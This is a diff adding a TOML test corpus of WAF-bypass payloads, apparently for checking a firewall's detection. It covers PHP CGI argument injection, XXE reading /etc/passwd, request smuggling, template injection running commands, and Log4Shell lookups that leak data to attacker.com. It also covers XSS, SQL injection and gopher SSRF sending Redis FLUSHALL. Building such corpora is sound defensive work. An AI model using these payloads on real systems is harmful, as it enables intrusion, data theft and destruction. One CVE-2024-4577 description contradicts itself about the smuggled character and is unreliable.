@@ -1,0 +1,158 @@
+schema = 1
+# Real-world bypass cases — payloads observed in active CVE PoCs,
+# commercial WAF research disclosures, and CTF write-ups in
+# 2024–2026.  Each case is HARDER than a generic regex catch:
+# either the WAF would need vendor-specific knowledge or a
+# parser-level normalisation to flag them.
+
+# ── CVE-2024-7593: Ivanti vTM auth bypass via path traversal ──
+[[case]]
+id = "cve_2024_7593_ivanti_vtm"
+class = "cve_pocs"
+payload = "/login/?path=..%2f..%2fconfig"
+description = "Ivanti vTM admin panel — encoded ../ traversal slipping past their custom path  normaliser.  WAFs that decode once and pattern-match on `../` miss this  because the decode-once happens BEFORE the second %2f appears."
+
+# ── CVE-2024-4577: PHP CGI argument injection (the BIG one) ──
+[[case]]
+id = "cve_2024_4577_php_cgi_arg_injection"
+class = "cve_pocs"
+payload = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a%2f%2finput"
+description = "PHP CGI on Windows: BestFit charset mapping turns soft-hyphen (U+00AD) →  ASCII hyphen, letting attackers smuggle -d flags into php.exe.  WAFs  that lowercase-folded the request never see the `-d` because it was  originally `−d` (U+2212 minus sign)."
+
+[[case]]
+id = "cve_2024_4577_softhyphen_variant"
+class = "cve_pocs"
+payload = "?%c2%ad-d+allow_url_include%3d1"
+description = "Soft-hyphen UTF-8 prefix variant.  Same CVE; this is the form that  bypasses WAFs scanning for the literal `-d` token."
+
+# ── ProxyShell / Exchange (CVE-2021-34473 family, still active) ──
+[[case]]
+id = "exchange_proxyshell_autodiscover"
+class = "cve_pocs"
+payload = "/autodiscover/autodiscover.json/?@evil.com/ews/exchange.asmx"
+description = "Proxy-Shell-style email-style address smuggling via `@` in URL path.   Many WAF rules don't normalise the `@` semantics before  pattern-matching the routing prefix."
+
+# ── XML External Entity (XXE) — bytestream-confusing forms ──
+[[case]]
+id = "xxe_utf16_le_with_bom"
+class = "cve_pocs"
+payload = "\\u{FEFF}<?xml version=\"1.0\" encoding=\"UTF-16LE\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+description = "BOM-prefixed UTF-16LE XML.  Lots of WAFs see UTF-8 and fail to parse  the DOCTYPE; the XML parser auto-detects UTF-16 from the BOM."
+
+[[case]]
+id = "xxe_billion_laughs_param_entity"
+class = "cve_pocs"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY % a \"&#x25;b;\"><!ENTITY % b \"<!ENTITY c '&#x25;a;'>\">%a;]><r>&c;</r>"
+description = "Parameter-entity nested billion-laughs.  Defeats DTD-strip WAFs that  only look at <!ENTITY ... > but not nested parameter-entity expansion."
+
+# ── HTTP request smuggling — modern variants ──
+[[case]]
+id = "smuggling_cl0te_with_chunk_ext"
+class = "cve_pocs"
+payload = "POST /api HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 12\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0;name=value\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n"
+description = "CL.0 smuggling with chunk extension `;name=value`.  Cloudflare and  Akamai both honoured chunk extensions through 2024.  Recent fixes  landed but lots of deployments lag."
+
+[[case]]
+id = "smuggling_te_te_with_obs_fold"
+class = "cve_pocs"
+payload = "POST /a HTTP/1.1\\r\\nHost: x\\r\\nTransfer-Encoding:\\r\\n chunked\\r\\nTransfer-Encoding: x\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n\\r\\n"
+description = "TE.TE with RFC 7230 §3.2.4 obsolete line-folding (CRLF + SP).  Most  WAFs reject obs-fold; some lenient origins accept, producing the  desync."
+
+# ── GraphQL: introspection-spoofing query-string smuggling ──
+[[case]]
+id = "graphql_alias_introspection_smuggle"
+class = "cve_pocs"
+payload = "query { user(id:1) { name } x: __schema { types { name fields { name } } } }"
+description = "GraphQL aliasing — query LOOKS like a user-record fetch but the `x:`  alias smuggles full introspection.  Static-pattern WAFs that block on  `__schema` literal still fire here, but ML-based WAFs miss the  aliasing trick."
+
+# ── Server-side template injection — modern payloads ──
+[[case]]
+id = "ssti_jinja_sandbox_escape_2024"
+class = "cve_pocs"
+payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+description = "Jinja2 sandbox escape using `self.__init__.__globals__` — the canonical  2024 form.  Some WAFs catch `__import__` but miss the `__globals__`  walk."
+
+[[case]]
+id = "ssti_freemarker_assign_to_new_obj"
+class = "cve_pocs"
+payload = "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"id\")}"
+description = "FreeMarker SSTI via dynamic class loading.  Catches WAFs blocking only  Jinja-style `{{ }}` while letting FreeMarker `<#...>` through."
+
+# ── Log4Shell — modern obfuscated variants ──
+[[case]]
+id = "log4shell_nested_env_substitution"
+class = "cve_pocs"
+payload = "${${lower:j}${lower:n}di:ldap://${env:HOME}/attacker.com/x}"
+description = "Log4Shell with nested `${env:...}` substitution to leak the env var  inline.  Defeats WAFs that pattern on the literal `jndi:` substring."
+
+[[case]]
+id = "log4shell_thread_context_map_leak"
+class = "cve_pocs"
+payload = "${jndi:ldap://${sys:user.name}.${sys:os.name}.attacker.com/x}"
+description = "Log4Shell that leaks user.name + os.name via DNS lookup hostname.   Used for fingerprinting without needing an open LDAP listener."
+
+# ── XSS — DOM clobbering + mutation XSS ──
+[[case]]
+id = "xss_dom_clobber_form_action"
+class = "cve_pocs"
+payload = "<form id='config' action='javascript:alert(1)'><input name='url' value='evil'></form>"
+description = "DOM-clobbering attack on app code that does `config.url`.  Form  element's `action` shadows the property.  Defeats CSP if app loads  external JSON config first."
+
+[[case]]
+id = "xss_mutation_html_image_innertext"
+class = "cve_pocs"
+payload = "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"
+description = "mXSS via Chrome's HTML tokenizer reparsing `<noscript>` content after  page load.  DOMPurify ≤3.0.5 missed this; 3.0.6 fixed it but many  deployments lag."
+
+# ── SQL — second-order injection chains ──
+[[case]]
+id = "sqli_second_order_via_quote_escape"
+class = "cve_pocs"
+payload = "admin'-- "
+description = "Second-order: store as username, app later builds `WHERE username='admin'-- '`.  Stored value passes input WAF (just a username), exploit fires on  next-page render."
+
+[[case]]
+id = "sqli_blind_time_via_sleep"
+class = "cve_pocs"
+payload = "' AND SLEEP(5) AND '1'='1"
+description = "Blind time-based SQLi.  Defeats response-content WAF rules; only catches  if WAF inspects response latency relative to baseline (`ffuf -ac`-style)."
+
+# ── Path traversal — non-canonical encodings ──
+[[case]]
+id = "path_traversal_unicode_normalisation"
+class = "cve_pocs"
+payload = "/static/..%c0%ae%c0%ae/etc/passwd"
+description = "Overlong UTF-8 encoding of `.`.  IIS, Apache mod_proxy, and Tomcat have  all historically decoded `%c0%ae` to `.` despite RFC 3629 forbidding  it.  WAFs that lowercase-and-decode-once still miss."
+
+[[case]]
+id = "path_traversal_double_url_encode"
+class = "cve_pocs"
+payload = "/api/file?path=..%252fconfig%252fsecrets.json"
+description = "Double URL encoding.  WAFs that decode once see `..%2fconfig` (not a  traversal); origins that decode twice see `../config/secrets.json`."
+
+# ── SSRF — protocol smuggling ──
+[[case]]
+id = "ssrf_gopher_to_redis"
+class = "cve_pocs"
+payload = "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"
+description = "Gopher-protocol SSRF to embed a Redis FLUSHALL command via the gopher  URL.  Defeats WAFs that only block `http://localhost`."
+
+[[case]]
+id = "ssrf_dns_rebinding_via_nip_io"
+class = "cve_pocs"
+payload = "http://127.0.0.1.nip.io/admin"
+description = "DNS-rebinding-friendly hostname.  Resolves to 127.0.0.1; allowlists  that only block literal `127.0.0.1` / `localhost` miss this."
+
+# ── Cache deception ──
+[[case]]
+id = "cache_deception_static_extension_in_path"
+class = "cve_pocs"
+payload = "/account/settings/nonexistent.css"
+description = "Cache-deception attack: app routes /account/settings/* dynamically; CDN  caches anything ending in .css.  Attacker visits, caches their session  page, next visitor gets it."
+
+# ── Open redirect — modern bypasses ──
+[[case]]
+id = "open_redirect_userinfo_smuggle"
+class = "cve_pocs"
+payload = "//evil.com\\@trusted.com/path"
+description = "URL parsers disagreeing on whether `\\` separates host from userinfo.   Browsers go to evil.com; some app parsers see trusted.com host."
